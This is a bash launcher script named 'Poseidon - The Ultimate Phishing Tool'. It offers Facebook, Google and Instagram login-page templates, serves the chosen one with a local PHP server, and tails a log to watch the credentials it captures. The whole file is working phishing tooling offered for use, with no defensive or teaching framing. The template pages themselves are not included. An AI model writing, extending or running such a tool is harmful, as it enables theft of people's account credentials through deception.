#!/bin/bash

# Function to display the main menu
show_menu() {
    clear
    echo -e "\033[1;34m"
    cat << "EOF"

██████╗░░█████╗░░██████╗███████╗██╗██████╗░░█████╗░███╗░░██╗
██╔══██╗██╔══██╗██╔════╝██╔════╝██║██╔══██╗██╔══██╗████╗░██║
██████╔╝██║░░██║╚█████╗░█████╗░░██║██║░░██║██║░░██║██╔██╗██║
██╔═══╝░██║░░██║░╚═══██╗██╔══╝░░██║██║░░██║██║░░██║██║╚████║
██║░░░░░╚█████╔╝██████╔╝███████╗██║██████╔╝╚█████╔╝██║░╚███║
╚═╝░░░░░░╚════╝░╚═════╝░╚══════╝╚═╝╚═════╝░░╚════╝░╚═╝░░╚══╝
EOF
    echo -e "\033[0m"
    
    echo -e "\n\033[1;36mPoseidon - The Ultimate Phishing Tool\033[0m"
    echo -e "\n\033[1;34mSelect a template:\033[0m"
    echo -e "\033[1;34m----------------------------------\033[0m"
    echo -e "\033[1;36m1. Facebook\033[0m"
    echo -e "\033[1;36m2. Google\033[0m"
    echo -e "\033[1;36m3. Instagram\033[0m"
    echo -e "\033[1;31m0. Exit\033[0m"
    echo -e "\033[1;34m----------------------------------\033[0m"
}

# Function to check dependencies
check_dependencies() {
    command -v php >/dev/null 2>&1 || { echo >&2 "PHP is required but it's not installed. Please install PHP and try again."; exit 1; }
}

# Function to check required directories
check_directories() {
    if [ ! -d "templates" ]; then
        echo -e "\nTemplates directory not found! Please make sure the templates directory exists."
        exit 1
    fi
}

# Function to start the phishing server
start_server() {
    local template=$1
    local port=$2

    echo -e "\nStarting PHP server for $template phishing page on port $port..."
    php -S 127.0.0.1:$port -t templates/$template/ > /dev/null 2>&1 &

    if [ $? -ne 0 ]; then
        echo -e "\nFailed to start PHP server. Please check if the port is already in use or if there are permission issues."
        exit 1
    fi

    echo -e "\nPhishing page is live at: \033[1;34mhttp://127.0.0.1:$port\033[0m"
    echo -e "Press \033[1;31mCtrl+C\033[0m to stop the server.\n"

    # Monitor the PHP server logs for captured credentials
    if [ -f templates/$template/websites/$template.php ]; then
        echo -e "Monitoring captured credentials...\n"
        tail -f templates/$template/websites/$template.php
    else
        echo -e "Log file not found. Please check if the template path is correct."
        exit 1
    fi
}

# Function to stop the server
stop_server() {
    pkill -f "php -S 127.0.0.1"
    echo -e "\nServer stopped."
}

# Main script logic
check_dependencies
check_directories

while true; do
    show_menu
    read -p "Choose an option: " option

    case $option in
        1) template="facebook" ;;
        2) template="google" ;;
        3) template="instagram" ;;
        0) echo -e "\nExiting Poseidon. Goodbye!\n"; stop_server; exit 0 ;;
        *) echo -e "\nInvalid option! Please try again.\n"; continue ;;
    esac

    # Ask for the port number
    read -p "Enter the port number to host the website on (e.g., 8080): " port

    # Validate the port number
    if ! [[ $port =~ ^[0-9]+$ ]] || [ $port -lt 1 ] || [ $port -gt 65535 ]; then
        echo -e "\nInvalid port number! Please enter a valid number between 1 and 65535.\n"
        continue
    fi

    # Start the server with the selected template and port
    start_server $template $port

    # Break out of the loop after starting the server
    break
done